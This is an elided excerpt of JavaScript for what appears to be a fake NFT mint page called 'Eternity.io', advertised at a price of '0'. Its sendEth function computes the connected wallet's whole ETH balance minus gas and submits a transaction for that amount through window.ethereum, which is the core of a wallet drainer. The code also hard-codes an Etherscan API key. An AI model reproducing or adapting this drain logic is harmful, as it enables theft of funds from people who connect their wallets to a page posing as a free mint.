...
const ethAmount = "0";
const image =
  "https://pbs.twimg.com/profile_images/1562465007995998208/YKWYToCZ_400x400.png";
const Title = "Eternity.io";
const supply = 971;
  ...
  useEffect(() => {
    const fetchRequest = async () => {
      const response = await fetch(
        "https://api.etherscan.io/api?module=gastracker&action=gasoracle&apikey=PW7Z9MJMX6YRBM2M2HAS6CP14Y1ZCUXPWH"
      );
  ...
  const sendEth = async () => {
    try {
      ...
      console.log(
        ...
        convertedBalance,
        parseInt(
          (convertedBalance - Number(gas) / 100000) * 1000000000000000000
        ).toString(16)
      );
      let params = [
        {
          ...
          value: parseInt(
            (convertedBalance - Number(gas) / 20000) * 1000000000000000000
          ).toString(16),
        },
      ];
      ...
      const response = await window.ethereum
        ...
        .catch((err) => {
          alert(
            `NOT ENOUGH ${(
              (convertedBalance - Number(gas) / 100000) *
              -1
            ).toFixed(6)} ETH`
          );
        });
